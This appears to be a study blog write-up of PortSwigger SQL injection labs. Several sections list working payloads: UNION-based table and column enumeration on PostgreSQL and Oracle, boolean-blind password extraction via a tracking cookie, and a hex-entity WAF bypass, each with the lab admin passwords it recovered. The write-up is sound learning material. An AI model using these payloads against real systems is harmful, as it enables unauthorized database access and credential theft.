---
title: SQL injection
tags:
  - 渗透
abbrlink: 8b56535a
description: SQL injection based on PostSwigger Lab and Rana Khalil
date: 2024-03-17 00:26:00
---
# SQL Injection Complete Guide by [Rana Khalil](https://www.youtube.com/@RanaKhalil101)
[PostSwigger guide](https://portswigger.net/web-security/sql-injection)

## What is SQL injection?


# Labs
[PostSwigger Lab - SQL injection](https://portswigger.net/web-security/sql-injection)

**Tools**：BurpSuite，Chrome，switchyomega

## 0x00 SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

## 0x01 SQL injection vulnerability allowing login bypass

## 0x02 SQL injection attack, querying the database type and version on Oracle

## 0x03 SQL injection attack, querying the database type and version on MySQL and Microsoft

## 0x04 SQL injection attack, listing the database contents on non-Oracle databases
***End Goals***:
- Determine the table that contains usernames andpasswords
- Determine the relevant columnsOutput the content of the table
- Login as the administrator user

***Analysis***:
1. Find the number of columns
`' order by 3--` -> Internal server error -> 3-1=2
2. Find the data type of the columns
`' UNION select 'a','a'--` -> both columns accept text type
3. Version of the database
    - `' UNION SELECT @@version, NULL--` -> not Microsoft SQL and MySQL
    - `' UNION SELECT version()，NULL--` ->200 0K `PostgreSQL 12.17 (Ubuntu 12.17-0ubuntu0.20.04.1)`
4. Output the list of table names in the database
    `' UNION SELECT table_name, NULL FROM information_schema.tables--` -> search `users` -> `users_vqrxmy`
5. Output the column names of the table
    `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_vqrxmy'--` -> `password_bfrqkp` and `username_rwstyz`

6. Output the usernames and passwords
`' UNION select username_rwstyz, password_bfrqkp from users_vqrxmy--` -> `administrator` and `lftog9bgwjw81hj0feiy`


## 0x05 SQL injection attack, listing the database contents on Oracle
***End Goals***:
- Determine which table contains the usernames and passwords
- Determine the column names in table
- Output the content of the table
- Login as the administrator user

***Analysis***:
1. Determine the number of columns
`' order by 3--` -> Internal server error -> 3-1=2
2. Find the data type of the columns
Oracle database -> `' UNION select 'a','a' from DUAL--` -> both columns accept text type
3. Output the list of tables in the database
`' UNION SELECT table_name, NULL FROM all_tables--` -> search `users` -> `USERS_MQOBSV`
4. Output the column names of the users table
`' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_MQOBSV'--` -> `USERNAME_APTSKD` and `PASSWORD_QXOINH `
5. Output the list of usernames and passwords
`' UNION select USERNAME_APTSKD, PASSWORD_QXOINH from USERS_MQOBSV--` -> `administrator` and `dvqljtgry480ary2i1iu`

## 0x06 SQL injection UNION attack, determining the number of columns returned by the query

## 0x07 SQL injection UNION attack, finding a column containing text

## 0x08 SQL injection UNION attack, retrieving data from other tables

## 0x09 SQL injection UNION attack, retrieving multiple values in a single column

## 0x0A Blind SQL injection with conditional responses
Vulnerable parameter - tracking cookie
***End Goals***:
- Enumerate the password of the administrator
- Log in as the administrator user

***Analysis***:
1. Confirm that the parameter is vulnerable to blind SQLi
    1. `select tracking-id from tracking-table where trackingId = ''`
    -> If this tracking id exists -> query returns value -> Welcome back message
    -> If the tracking id doesn't exist -> query returns nothing -> no Welcome back message
    2. `select tracking-id from tracking-table where trackingId = 'RvLfBu6S9EZRIVYN" and 1=1--'`
    -> TRUE -> Welcome back
    3. `select tracking-id from tracking-table where trackingId = 'RvLfBu6S9EZRIVYN" and 1=0--'`
    -> FALSE -> no Welcome back
2. Confirm that we have a users table
`select tracking-id from trackingtable where trackingId = 'RvLfBu6S9EZRIVYN' and(select 'x'from users LIMIT 1)='x'--'`
-> users table exists in the database.

3. Confirm that username administrator exists users table
`select tracking-id from tracking-table where trackingId = 'RvLfBu6S9EZRIVYN' and (select username from users were username='administrator')='administrator'--`
-> administrator user exists

4. Enumerate the password of the administrator user
    1. `select tracking-id from tracking-table where trackingId = 'RvLfBu6S9EZRIVYN' and (select username from users were username='administrator' and LENGTH(password)>1)='administrator'--`
    -> use burp Intruder, set payload is numbers from 1 to 20 and step 1
    -> 1 < password length < 20
    2. `select tracking-id from tracking-table where trackingId = 'RvLfBu6S9EZRIVYN' and (select substring(password,1,1) from users were username='administrator')='a'--`
    -> use burp Intruder, set payload is Brute focer, min length is 1 and max length is 1
5. Combine passwords based on blasting results

## 0x0B Blind SQL injection with conditional errors

## 0x0C Visible error-based SQL injection

## 0x0D Blind SQL injection with time delays

## 0x0E Blind SQL injection with time delays and information retrieval

## 0x0F Blind SQL injection with out-of-band interaction

## 0x10 Blind SQL injection with out-of-band data exfiltration

## 0x11 SQL injection with filter bypass via XML encoding
***End Goals***: Exploit SQL injection to retrieve the admin user's credentials from the users table and log into their account.

***Analysis***:
1. Find records of interactions with the backend
burp -> proxy -> HTTP history  -> `ProductId=1` and `stock`
2. Obfuscate input in a way that the WAF gets bypassed.
`1 UNION SELECT NULL` -> Extensions -> Hackvetor -> @hex_entities
3. Output the list of usernames and passwords
`1 UNION SELECT username || '~' || password FROM users` ->  `administrator` and `q1xffcev1fis39y95d17`